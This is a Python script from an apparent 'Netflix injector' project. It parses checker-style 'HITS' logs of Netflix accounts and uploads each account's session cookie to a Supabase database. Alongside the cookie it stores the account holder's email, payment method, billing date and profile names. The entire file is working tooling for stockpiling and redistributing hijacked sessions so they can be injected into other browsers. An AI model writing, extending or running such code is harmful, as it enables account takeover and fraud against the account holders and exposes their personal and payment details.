#!/usr/bin/env python3
"""
Import premium Netflix cookies from text file to Supabase.
Parses the format from premium_cookies_not_in_DB_yet.txt

Usage: python import_premium_cookies.py
"""

import json
import re
import requests
import os
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

INPUT_FILE = r"c:\Users\Admin\Downloads\NETFLIX_INJECTOR\NETFLIX_INJECTOR\premium_cookies_not_in_DB_yet.txt"

# Supabase credentials from .env
SUPABASE_URL = os.environ.get("INJECTOR_SUPABASE_URL")
SUPABASE_KEY = os.environ.get("INJECTOR_SUPABASE_KEY")

if not SUPABASE_URL or not SUPABASE_KEY:
    raise ValueError("INJECTOR_SUPABASE_URL and INJECTOR_SUPABASE_KEY must be set in .env file")

def parse_cookies_file(filepath):
    """Parse the premium cookies text file and extract cookie data."""
    with open(filepath, 'r', encoding='utf-8') as f:
        content = f.read()
    
    # Split into blocks between the HITS markers
    # Pattern: each hit block starts with "🎯 HITS #N" and ends before the next one
    hit_blocks = re.split(r'🎯 HITS #\d+', content)
    
    cookies_to_insert = []
    
    for hit in hit_blocks[1:]:  # Skip the header before first hit
        
        # Extract email
        email_match = re.search(r'📩 Email:\s*(.*?)(?=\n)', hit)
        email = email_match.group(1).strip() if email_match else None
        
        # Extract Netflix cookie
        cookie_match = re.search(r'Netflix COOKIE:\s*(\S+)', hit)
        if not cookie_match:
            continue
        
        netflix_cookie = cookie_match.group(1).strip()
        
        # Parse the NetflixId cookie value
        netflix_id_match = re.search(r'NetflixId=([^&]+)', netflix_cookie)
        if not netflix_id_match:
            continue
        
        netflix_id_value = netflix_id_match.group(1)
        
        # Extract country
        country_match = re.search(r'🌐 Country:\s*(.*?)(?=\n)', hit)
        country = country_match.group(1).strip() if country_match else "Unknown"
        
        # Extract plan
        plan_match = re.search(r'🎯 Plan:\s*(.*?)(?=\n)', hit)
        plan = plan_match.group(1).strip() if plan_match else "Premium"
        
        # Extract next billing date
        billing_match = re.search(r'🧾 Next Billing:\s*(.*?)(?=\n)', hit)
        next_billing = billing_match.group(1).strip() if billing_match else None
        
        # Extract payment method
        payment_match = re.search(r'💳 Payment:\s*(.*?)(?=\n)', hit)
        payment = payment_match.group(1).strip() if payment_match else None
        
        # Extract quality
        quality_match = re.search(r'⭐️ Quality:\s*(.*?)(?=\n)', hit)
        quality = quality_match.group(1).strip() if quality_match else None
        
        # Extract streams
        streams_match = re.search(r'📺 Streams:\s*(.*?)(?=\n)', hit)
        streams = streams_match.group(1).strip() if streams_match else None
        
        # Extract price
        price_match = re.search(r'💰 Price:\s*(.*?)(?=\n)', hit)
        price = price_match.group(1).strip() if price_match else None
        
        # Extract profiles
        profiles_match = re.search(r'👤 Profiles \((\d+)\):\s*(.*?)(?=\n)', hit)
        profiles = profiles_match.group(2).strip() if profiles_match else None
        
        # Create cookie object
        cookie_obj = {
            "name": "NetflixId",
            "value": netflix_id_value,
            "domain": ".netflix.com",
            "path": "/",
            "secure": True,
            "httpOnly": True,
            "sameSite": "Lax",
            "expirationDate": 2147483647,
            "session": False
        }
        
        cookies_json = json.dumps([cookie_obj])
        
        # Create description with all account details
        description_parts = [f"EMAIL: {email}"]
        if country:
            description_parts.append(f"COUNTRY: {country}")
        if plan:
            description_parts.append(f"PLAN: {plan}")
        if next_billing:
            description_parts.append(f"BILLING: {next_billing}")
        if payment:
            description_parts.append(f"PAYMENT: {payment}")
        if quality:
            description_parts.append(f"QUALITY: {quality}")
        if streams:
            description_parts.append(f"STREAMS: {streams}")
        if price:
            description_parts.append(f"PRICE: {price}")
        if profiles:
            description_parts.append(f"PROFILES: {profiles}")
        
        entry = {
            "cookies": cookies_json,
            "description": " | ".join(description_parts)
        }
        
        cookies_to_insert.append(entry)
    
    return cookies_to_insert


def insert_cookies(cookies_list):
    """Batch insert cookies into Supabase."""
    if not cookies_list:
        print("No cookies to insert.")
        return
    
    print(f"Found {len(cookies_list)} cookies to insert.")
    
    batch_size = 50
    inserted = 0
    failed = 0
    
    for i in range(0, len(cookies_list), batch_size):
        batch = cookies_list[i:i + batch_size]
        
        headers = {
            "apikey": SUPABASE_KEY,
            "Authorization": f"Bearer {SUPABASE_KEY}",
            "Content-Type": "application/json",
            "Prefer": "return=minimal"
        }
        
        try:
            response = requests.post(
                f"{SUPABASE_URL}/rest/v1/cookie_sessions",
                json=batch,
                headers=headers
            )
            
            if response.status_code == 201:
                inserted += len(batch)
                print(f"✓ Batch {i//batch_size + 1}: Inserted {len(batch)} cookies")
            else:
                failed += len(batch)
                print(f"✗ Batch {i//batch_size + 1}: Failed - {response.status_code}")
                print(f"  Response: {response.text[:200]}")
        
        except Exception as e:
            failed += len(batch)
            print(f"✗ Batch {i//batch_size + 1}: Exception - {str(e)}")
    
    print(f"\n{'='*50}")
    print(f"Summary: {inserted} inserted, {failed} failed")
    print(f"{'='*50}")


def main():
    print("Parsing premium cookies file...")
    cookies = parse_cookies_file(INPUT_FILE)
    
    if cookies:
        print(f"\nSuccessfully parsed {len(cookies)} cookies.")
        print("\nFirst cookie preview:")
        print(json.dumps(cookies[0], indent=2))
        print("\n" + "="*50)
        
        insert_cookies(cookies)
    else:
        print("No cookies found in file.")


if __name__ == "__main__":
    main()
